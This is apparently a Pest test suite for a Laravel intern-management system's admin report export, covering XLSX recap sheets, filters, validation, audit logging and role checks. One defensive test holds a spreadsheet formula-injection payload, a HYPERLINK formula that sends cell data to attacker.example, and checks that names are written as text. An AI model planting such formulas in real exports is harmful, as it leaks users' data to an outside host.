<?php

use App\Models\Airport;
use App\Models\Assessment;
use App\Models\AssessmentIndicator;
use App\Models\AssessmentScore;
use App\Models\Attendance;
use App\Models\AuditLog;
use App\Models\LeaveRequest;
use App\Models\Logbook;
use App\Models\Unit;
use App\Models\User;
use Illuminate\Support\Carbon;
use Illuminate\Testing\TestResponse;
use OpenSpout\Reader\XLSX\Reader;

beforeEach(function () {
    $this->travelTo(Carbon::parse('2026-10-12 10:00:00'));

    $this->admin = User::factory()->admin()->create(['name' => 'Admin Sinta']);
    $this->sari = User::factory()->mentor()->create(['name' => 'Sari Wijaya']);
    $this->budiMentor = User::factory()->mentor()->create(['name' => 'Budi Santoso']);
    $this->soetta = Airport::factory()->create(['name' => 'Soekarno-Hatta']);
    $this->rina = reportIntern($this, $this->sari, 'Rina Wulandari');
});

function reportIntern($test, User $mentor, string $name, array $profile = [], array $attributes = []): User
{
    return User::factory()->intern([
        'mentor_id' => $mentor->id,
        'airport_id' => $test->soetta->id,
        'university' => 'Telkom University',
        'major' => 'Sistem Informasi',
        'start_date' => '2026-09-01',
        'end_date' => '2026-12-31',
        ...$profile,
    ])->create([
        'name' => $name,
        'email' => mb_strtolower(str_replace(' ', '.', $name)).'@injourney.test',
        'unit_id' => Unit::query()->firstOrCreate(['name' => 'Divisi IT'])->id,
        ...$attributes,
    ]);
}

function reportRequest(User $user, string $action, array $data): TestResponse
{
    app('auth')->forgetGuards();

    return test()->postJson("/api/admin/reports/{$action}", $data, ['Authorization' => 'Bearer '.$user->createToken('api')->plainTextToken]);
}

/**
 * @return array<string, list<list<mixed>>> baris per nama sheet
 */
function xlsxSheets(TestResponse $response): array
{
    $reader = new Reader;
    $reader->open($response->baseResponse->getFile()->getPathname());
    $sheets = [];

    foreach ($reader->getSheetIterator() as $sheet) {
        foreach ($sheet->getRowIterator() as $row) {
            $sheets[$sheet->getName()][] = $row->toArray();
        }
    }

    $reader->close();

    return $sheets;
}

/**
 * Baris data setelah baris judul kolom (kolom pertama "Nama").
 *
 * @param  list<list<mixed>>  $rows
 * @return list<list<mixed>>
 */
function tableRows(array $rows): array
{
    $header = array_search('Nama', array_column($rows, 0), true);

    return array_slice($rows, $header + 1);
}

const IDENTITY_RINA = ['Rina Wulandari', 'rina.wulandari@injourney.test', 'Divisi IT', 'Soekarno-Hatta', 'Telkom University', 'Sistem Informasi', 'Sari Wijaya', '1 Sep 2026 - 31 Des 2026'];

it('writes one sheet per selected recap with the intern identity and numeric columns, and logs the export', function () {
    Attendance::factory()->for($this->rina, 'intern')->create(['date' => '2026-10-05', 'clock_in_at' => '07:55:00']);
    Attendance::factory()->for($this->rina, 'intern')->create(['date' => '2026-10-06', 'clock_in_at' => '08:30:00']);
    Attendance::factory()->for($this->rina, 'intern')->clockedIn()->create(['date' => '2026-10-07']);
    LeaveRequest::factory()->for($this->rina, 'intern')->approved()->create(['type' => 'sick', 'start_date' => '2026-10-08', 'end_date' => '2026-10-09']);

    $response = reportRequest($this->admin, 'export', ['from' => '2026-10-05', 'to' => '2026-10-09'])
        ->assertOk()
        ->assertDownload('laporan-intern_2026-10-05_2026-10-09.xlsx');

    $sheets = xlsxSheets($response);
    expect(array_keys($sheets))->toBe(['Rekap Presensi', 'Rekap Izin', 'Rekap Logbook', 'Rekap Penilaian'])
        ->and($sheets['Rekap Presensi'][2][0])->toBe('Periode: 5 Okt 2026 - 9 Okt 2026')
        ->and($sheets['Rekap Presensi'][3][0])->toBe('Filter: Lokasi Semua; Mentor Semua; Intern Semua')
        // Hari kerja 5 hari: Hadir 2 (termasuk Lupa Clock Out), Terlambat 1, Izin 2; kehadiran 3 / (5 - 2).
        ->and(tableRows($sheets['Rekap Presensi']))->toBe([[...IDENTITY_RINA, 5, 2, 1, 0, 1, 2, 0, 0, 100]])
        ->and(tableRows($sheets['Rekap Izin']))->toBe([[...IDENTITY_RINA, 1, 3, 2, 2, 0, 'Tidak']])
        // Tiga hari berpresensi tanpa logbook.
        ->and(tableRows($sheets['Rekap Logbook']))->toBe([[...IDENTITY_RINA, 0, 0, 0, 3]])
        ->and(AuditLog::sole()->only(['action', 'object', 'detail']))->toBe([
            'action' => 'Laporan',
            'object' => 'Rekap Presensi, Rekap Izin, Rekap Logbook, Rekap Penilaian',
            'detail' => 'Export Excel 5 Okt 2026 - 9 Okt 2026, 1 intern. Filter: Lokasi Semua; Mentor Semua; Intern Semua.',
        ]);
});

it('counts logbook states over the required days in the period', function () {
    $states = ['2026-10-01' => 'approved', '2026-10-02' => 'pending_review', '2026-10-05' => 'revision', '2026-10-06' => 'draft'];

    foreach ($states as $date => $status) {
        Logbook::factory()->for(Attendance::factory()->for($this->rina, 'intern')->create(['date' => $date]))->create(['status' => $status]);
    }
    Attendance::factory()->for($this->rina, 'intern')->create(['date' => '2026-10-07']);

    $sheets = xlsxSheets(reportRequest($this->admin, 'export', ['from' => '2026-10-01', 'to' => '2026-10-31', 'sheets' => ['logbook']])->assertOk());

    expect(array_keys($sheets))->toBe(['Rekap Logbook'])
        ->and(tableRows($sheets['Rekap Logbook']))->toBe([[...IDENTITY_RINA, 1, 1, 1, 2]]);
});

it('lists scores per indicator, final score, assessor, and submit date', function () {
    $attendanceIndicator = AssessmentIndicator::factory()->create(['name' => 'Kehadiran', 'sort_order' => 1]);
    $quality = AssessmentIndicator::factory()->create(['name' => 'Kualitas', 'sort_order' => 2]);
    $assessment = Assessment::factory()->submitted('87.50')->create(['intern_id' => $this->rina->id, 'mentor_id' => $this->sari->id, 'submitted_at' => '2026-10-10 15:00:00']);
    AssessmentScore::query()->create(['assessment_id' => $assessment->id, 'indicator_id' => $attendanceIndicator->id, 'score' => 90]);
    AssessmentScore::query()->create(['assessment_id' => $assessment->id, 'indicator_id' => $quality->id, 'score' => 85]);
    $andi = reportIntern($this, $this->sari, 'Andi Pratama');
    Assessment::factory()->create(['intern_id' => $andi->id]);

    $rows = xlsxSheets(reportRequest($this->admin, 'export', ['from' => '2026-10-01', 'to' => '2026-10-31', 'sheets' => ['assessment']])->assertOk())['Rekap Penilaian'];

    $header = $rows[array_search('Nama', array_column($rows, 0), true)];
    expect(array_slice($header, 8))->toBe(['Kehadiran', 'Kualitas', 'Nilai Akhir', 'Mentor Penilai', 'Tanggal Submit'])
        ->and(array_slice(tableRows($rows)[1], 8))->toBe([90, 85, 87.5, 'Sari Wijaya', '2026-10-10'])
        ->and(array_slice(tableRows($rows)[0], 8))->toBe(['', '', '', '', '']);
});

it('filters by airport, mentor, several interns, and exhausted quota, with a preview count', function () {
    $halim = Airport::factory()->create(['name' => 'Halim']);
    $andi = reportIntern($this, $this->budiMentor, 'Andi Pratama');
    $budi = reportIntern($this, $this->sari, 'Budi Halim', ['airport_id' => $halim->id]);
    reportIntern($this, $this->sari, 'Sudah Selesai', ['start_date' => '2026-07-01', 'end_date' => '2026-09-30']);
    LeaveRequest::factory()->for($andi, 'intern')->count(3)->sequence(
        ['start_date' => '2026-09-14', 'end_date' => '2026-09-14'],
        ['start_date' => '2026-09-21', 'end_date' => '2026-09-21'],
        ['start_date' => '2026-09-28', 'end_date' => '2026-09-28'],
    )->approved()->create();
    $base = ['from' => '2026-10-01', 'to' => '2026-10-31'];

    reportRequest($this->admin, 'preview', $base)->assertOk()->assertExactJson(['data' => ['interns' => 3]]);
    reportRequest($this->admin, 'preview', [...$base, 'airport_id' => $halim->id])->assertJsonPath('data.interns', 1);
    reportRequest($this->admin, 'preview', [...$base, 'mentor_id' => $this->budiMentor->id])->assertJsonPath('data.interns', 1);
    reportRequest($this->admin, 'preview', [...$base, 'intern_ids' => [$this->rina->id, $budi->id]])->assertJsonPath('data.interns', 2);
    reportRequest($this->admin, 'preview', [...$base, 'quota_exhausted' => true])->assertJsonPath('data.interns', 1);

    $sheets = xlsxSheets(reportRequest($this->admin, 'export', [...$base, 'quota_exhausted' => true, 'sheets' => ['leave']])->assertOk());
    expect(tableRows($sheets['Rekap Izin'])[0][0])->toBe('Andi Pratama')
        ->and(array_slice(tableRows($sheets['Rekap Izin'])[0], 8))->toBe([3, 3, 0, 0, 0, 'Ya'])
        ->and($sheets['Rekap Izin'][3][0])->toBe('Filter: Lokasi Semua; Mentor Semua; Intern Semua; hanya kuota izin habis');
});

it('tells the admin when no intern matches', function () {
    reportRequest($this->admin, 'export', ['from' => '2027-02-01', 'to' => '2027-02-28', 'sheets' => ['attendance']])
        ->assertUnprocessable()
        ->assertJsonPath('reason', 'no_data')
        ->assertJsonPath('message', 'Tidak ada data pada periode dan filter ini.');

    expect(AuditLog::count())->toBe(0);
});

it('writes names as text, never as spreadsheet formulas', function () {
    $payload = '=HYPERLINK("https://attacker.example/?d="&A9,"Rina Wulandari")';
    $this->rina->update(['name' => $payload]);

    $response = reportRequest($this->admin, 'export', ['from' => '2026-10-01', 'to' => '2026-10-09', 'sheets' => ['attendance']])->assertOk();

    $zip = new ZipArchive;
    $zip->open($response->baseResponse->getFile()->getPathname());
    $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
    $zip->close();

    expect($sheet)->not->toContain('<f>')
        ->and(array_merge(...xlsxSheets($response)['Rekap Presensi']))->toContain($payload);
});

it('validates the report form', function (array $data, string $field, string $message) {
    reportRequest($this->admin, 'export', ['from' => '2026-10-01', 'to' => '2026-10-09', 'sheets' => ['attendance'], ...$data])
        ->assertUnprocessable()
        ->assertJsonValidationErrors([$field => $message]);
})->with([
    'tanpa isi laporan' => [['sheets' => []], 'sheets', 'Pilih minimal satu isi laporan.'],
    'isi tidak dikenal' => [['sheets' => ['tasks']], 'sheets.0', 'Pilih minimal satu isi laporan.'],
    'periode terbalik' => [['to' => '2026-09-30'], 'to', 'Periode tidak valid.'],
    'lebih dari 12 bulan' => [['from' => '2025-10-01', 'to' => '2026-10-01'], 'to', 'Pilih periode maksimal 12 bulan.'],
    'bukan intern' => [['intern_ids' => [1]], 'intern_ids.0', 'Intern tidak ditemukan.'],
]);

it('accepts exactly twelve months', function () {
    reportRequest($this->admin, 'preview', ['from' => '2025-10-01', 'to' => '2026-09-30'])->assertOk();
});

it('offers interns with email, mentors, airports, and recap types as filters', function () {
    User::factory()->mentor()->inactive()->create(['name' => 'Mentor Lama']);

    app('auth')->forgetGuards();
    test()->getJson('/api/admin/reports/options', ['Authorization' => 'Bearer '.$this->admin->createToken('api')->plainTextToken])
        ->assertOk()
        ->assertJsonPath('data.interns', [['id' => $this->rina->id, 'name' => 'Rina Wulandari', 'email' => 'rina.wulandari@injourney.test']])
        ->assertJsonPath('data.mentors.*.name', ['Budi Santoso', 'Mentor Lama', 'Sari Wijaya'])
        ->assertJsonPath('data.mentors.1.is_active', false)
        ->assertJsonPath('data.airports.*.name', ['Soekarno-Hatta'])
        ->assertJsonPath('data.sheets', ['attendance' => 'Rekap Presensi', 'leave' => 'Rekap Izin', 'logbook' => 'Rekap Logbook', 'assessment' => 'Rekap Penilaian']);
});

it('lets only admins export', function (string $role) {
    reportRequest(User::factory()->{$role}()->create(), 'export', ['from' => '2026-10-01', 'to' => '2026-10-09'])->assertForbidden();
})->with(['intern', 'mentor']);
